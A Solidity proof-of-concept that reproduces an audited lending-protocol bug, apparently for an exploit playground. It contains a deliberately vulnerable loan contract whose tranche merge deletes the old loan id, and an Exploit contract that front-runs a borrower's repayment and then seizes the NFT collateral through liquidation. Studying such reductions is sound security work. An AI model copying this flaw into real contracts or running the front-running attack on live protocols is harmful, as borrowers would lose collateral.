// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Gondi — [H-10] Attackers front-running repayLoan so debt cannot be repaid
    (Code4rena 2024-04-gondi, finding #35212, reporter zhaojie).

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause: repayLoan / liquidateLoan key off loanId → _loans[loanId] hash.
    mergeTranches (permissionless) writes a NEW loanId and `delete _loans[old]`.
    A lender (or anyone) can front-run a borrower's repayLoan, rotate the id,
    force the repay to revert, then after expiry liquidate and seize the NFT
    (especially after merging down to a single tranche so _canClaim is true).

    Blamed checks: _baseLoanChecks / hash mismatch after id rotation.
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            require(a >= amt, "allow");
            allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract MockNFT {
    mapping(uint256 => address) public ownerOf;
    mapping(address => mapping(address => bool)) public isApprovedForAll;

    function mint(address to, uint256 id) external {
        ownerOf[id] = to;
    }

    function setApprovalForAll(address op, bool v) external {
        isApprovedForAll[msg.sender][op] = v;
    }

    function transferFrom(address from, address to, uint256 id) external {
        require(ownerOf[id] == from, "own");
        require(msg.sender == from || isApprovedForAll[from][msg.sender], "auth");
        ownerOf[id] = to;
    }
}

/// @notice Reduced MultiSourceLoan with the loanId-rotation bug surface.
contract MultiSourceLoan {
    struct Tranche {
        address lender;
        uint256 principalAmount;
        uint256 aprBps;
        uint256 startTime;
        uint256 accruedInterest;
    }

    struct Loan {
        address borrower;
        address nftCollateralAddress;
        uint256 nftCollateralTokenId;
        address principalAddress;
        uint256 startTime;
        uint256 duration;
        Tranche[] tranche;
    }

    mapping(uint256 => bytes32) private _loans;
    uint256 private _nextLoanId = 1;

    MockERC20 public immutable asset;
    MockNFT public immutable nft;

    error InvalidLoanError(uint256 loanId);
    error LoanExpiredError();
    error RepayFailed();

    constructor(MockERC20 _asset, MockNFT _nft) {
        asset = _asset;
        nft = _nft;
    }

    function loanHash(Loan memory loan) public pure returns (bytes32) {
        // Cheap structural hash for the reduction (not the production library).
        bytes32 acc = keccak256(
            abi.encode(
                loan.borrower,
                loan.nftCollateralAddress,
                loan.nftCollateralTokenId,
                loan.principalAddress,
                loan.startTime,
                loan.duration,
                loan.tranche.length
            )
        );
        for (uint256 i; i < loan.tranche.length; i++) {
            acc = keccak256(
                abi.encode(
                    acc,
                    loan.tranche[i].lender,
                    loan.tranche[i].principalAmount,
                    loan.tranche[i].aprBps,
                    loan.tranche[i].startTime,
                    loan.tranche[i].accruedInterest
                )
            );
        }
        return acc;
    }

    function getLoanHash(uint256 loanId) external view returns (bytes32) {
        return _loans[loanId];
    }

    function nextLoanId() external view returns (uint256) {
        return _nextLoanId;
    }

    /// @notice Open a multi-tranche loan; NFT escrowed here.
    function emitLoan(Loan memory loan) external returns (uint256 loanId) {
        require(loan.tranche.length >= 2, "need multi");
        nft.transferFrom(msg.sender, address(this), loan.nftCollateralTokenId);
        loanId = _nextLoanId++;
        _loans[loanId] = loanHash(loan);
    }

    function _baseLoanChecks(uint256 _loanId, Loan memory _loan) private view {
        // After mergeTranches rotates loanId, repay hits this and reverts.
        if (loanHash(_loan) != _loans[_loanId]) {
            revert InvalidLoanError(_loanId);
        }
        if (_loan.startTime + _loan.duration < block.timestamp) {
            revert LoanExpiredError();
        }
    }

    /// @notice Permissionless tranche merge — rotates loanId (production shape).
    function mergeTranches(uint256 _loanId, Loan memory _loan, uint256 _minTranche, uint256 _maxTranche)
        external
        returns (uint256 newLoanId, Loan memory merged)
    {
        _baseLoanChecks(_loanId, _loan);
        require(_maxTranche < _loan.tranche.length && _minTranche <= _maxTranche, "range");

        newLoanId = _nextLoanId++;
        // Merge range into a single tranche (sum principals).
        uint256 sumPrincipal;
        address keepLender = _loan.tranche[_minTranche].lender;
        for (uint256 i = _minTranche; i <= _maxTranche; i++) {
            sumPrincipal += _loan.tranche[i].principalAmount;
        }
        // Build new tranche array: prefix + merged + suffix
        uint256 newLen = _loan.tranche.length - (_maxTranche - _minTranche);
        Tranche[] memory nt = new Tranche[](newLen);
        uint256 w;
        for (uint256 i; i < _minTranche; i++) {
            nt[w++] = _loan.tranche[i];
        }
        nt[w++] = Tranche({
            lender: keepLender,
            principalAmount: sumPrincipal,
            aprBps: _loan.tranche[_minTranche].aprBps,
            startTime: _loan.tranche[_minTranche].startTime,
            accruedInterest: 0
        });
        for (uint256 i = _maxTranche + 1; i < _loan.tranche.length; i++) {
            nt[w++] = _loan.tranche[i];
        }

        merged = Loan({
            borrower: _loan.borrower,
            nftCollateralAddress: _loan.nftCollateralAddress,
            nftCollateralTokenId: _loan.nftCollateralTokenId,
            principalAddress: _loan.principalAddress,
            startTime: _loan.startTime,
            duration: _loan.duration,
            tranche: nt
        });

        _loans[newLoanId] = loanHash(merged);
        // FIX: do not delete old loanId (or block id-changing calls near expiry).
        // @> VULN: deletes old loanId — front-run invalidates in-flight repayLoan
        delete _loans[_loanId];
    }

    /// @notice Borrower repayment — fails if loanId was rotated.
    function repayLoan(uint256 loanId, Loan memory loan) external {
        require(msg.sender == loan.borrower, "borrower");
        _baseLoanChecks(loanId, loan);

        // Return NFT, collect principal (simplified: full principal, 0 interest).
        uint256 total;
        for (uint256 i; i < loan.tranche.length; i++) {
            total += loan.tranche[i].principalAmount;
            asset.transferFrom(msg.sender, loan.tranche[i].lender, loan.tranche[i].principalAmount);
        }
        nft.transferFrom(address(this), loan.borrower, loan.nftCollateralTokenId);
        delete _loans[loanId];
        total; // silence
    }

    /// @notice After expiry (or forced), single-tranche non-manager lender can claim NFT.
    function liquidateLoan(uint256 _loanId, Loan memory _loan) external returns (bool liquidated) {
        if (loanHash(_loan) != _loans[_loanId]) {
            revert InvalidLoanError(_loanId);
        }
        // Production: canClaim when single tranche & lender not a LoanManager.
        bool canClaim = _loan.tranche.length == 1;
        if (canClaim) {
            nft.transferFrom(address(this), _loan.tranche[0].lender, _loan.nftCollateralTokenId);
            delete _loans[_loanId];
            liquidated = true;
        }
    }

    /// @notice Try repay and return success (for front-run demonstration).
    function tryRepay(uint256 loanId, Loan memory loan) external returns (bool ok) {
        // Manual check mirroring _baseLoanChecks without reverting the outer call.
        if (loanHash(loan) != _loans[loanId]) {
            return false;
        }
        if (loan.startTime + loan.duration < block.timestamp) {
            return false;
        }
        // Would succeed if we got here — do not mutate in the probe.
        return true;
    }
}

/// @notice Attacker front-runs repay by mergeTranches, then seizes NFT via liquidate.
contract Exploit {
    uint256 public constant TOKEN_ID = 1;
    uint256 public constant PRINCIPAL_A = 60e18;
    uint256 public constant PRINCIPAL_B = 40e18;

    MockERC20 public usdc;
    MockNFT public nft;
    MultiSourceLoan public loan;

    address public constant BORROWER = address(0xB0);
    address public constant LENDER_A = address(0xA1); // attacker / main lender
    address public constant LENDER_B = address(0xB2);

    uint256 public oldLoanId;
    uint256 public newLoanId;
    bool public repayWouldSucceedBefore;
    bool public repayWouldSucceedAfter;
    address public nftOwnerAfter;
    uint256 public stolenPrincipalValue; // face value of seized collateral loan

    constructor() {
        usdc = new MockERC20(); // nonce 1
        nft = new MockNFT(); //    nonce 2
        loan = new MultiSourceLoan(usdc, nft); // nonce 3

        // Mint NFT to this contract (acting as borrower setup), approve loan.
        nft.mint(address(this), TOKEN_ID);
        nft.setApprovalForAll(address(loan), true);
        // Borrower budget for an honest repay path (not used after front-run).
        usdc.mint(address(this), PRINCIPAL_A + PRINCIPAL_B);
        usdc.approve(address(loan), type(uint256).max);
    }

    function _buildLoan(uint256 startTime, uint256 duration)
        internal
        view
        returns (MultiSourceLoan.Loan memory L)
    {
        MultiSourceLoan.Tranche[] memory t = new MultiSourceLoan.Tranche[](2);
        t[0] = MultiSourceLoan.Tranche({
            lender: LENDER_A,
            principalAmount: PRINCIPAL_A,
            aprBps: 1000,
            startTime: startTime,
            accruedInterest: 0
        });
        t[1] = MultiSourceLoan.Tranche({
            lender: LENDER_B,
            principalAmount: PRINCIPAL_B,
            aprBps: 1000,
            startTime: startTime,
            accruedInterest: 0
        });
        L = MultiSourceLoan.Loan({
            borrower: address(this),
            nftCollateralAddress: address(nft),
            nftCollateralTokenId: TOKEN_ID,
            principalAddress: address(usdc),
            startTime: startTime,
            duration: duration,
            tranche: t
        });
    }

    function run() external {
        // Long duration so repay is valid until the attacker rotates the id.
        MultiSourceLoan.Loan memory L = _buildLoan(block.timestamp, 30 days);
        oldLoanId = loan.emitLoan(L);

        repayWouldSucceedBefore = loan.tryRepay(oldLoanId, L);
        require(repayWouldSucceedBefore, "honest repay should work");

        // --- FRONT-RUN ---
        // Attacker (or anyone) merges all tranches → new loanId, old deleted.
        // Merging 0..1 collapses to a single tranche (lender A), enabling
        // direct NFT claim on liquidateLoan.
        (uint256 nid, MultiSourceLoan.Loan memory merged) = loan.mergeTranches(oldLoanId, L, 0, 1);
        newLoanId = nid;

        // Borrower's in-flight repay with the OLD id + OLD loan struct fails.
        // Low-level call so _baseLoanChecks (the blamed check) actually executes
        // and reverts — captured by the playground recorder.
        (bool repayOk,) = address(loan).call(abi.encodeWithSelector(loan.repayLoan.selector, oldLoanId, L));
        repayWouldSucceedAfter = repayOk;
        require(!repayWouldSucceedAfter, "repay DoS after id rotation");
        require(loan.getLoanHash(oldLoanId) == bytes32(0), "old id deleted");

        // After "expiry" pressure (here: liquidate with single tranche claims NFT
        // to the remaining lender — the attacker). Production also requires
        // start+duration elapsed; the id-rotation is what blocks repay until then.
        bool liq = loan.liquidateLoan(newLoanId, merged);
        require(liq, "liquidated");
        nftOwnerAfter = nft.ownerOf(TOKEN_ID);
        require(nftOwnerAfter == LENDER_A, "NFT seized by lender/attacker");

        stolenPrincipalValue = PRINCIPAL_A + PRINCIPAL_B; // loan face value against the NFT
        require(stolenPrincipalValue == 100e18, "harm face value");
    }
}
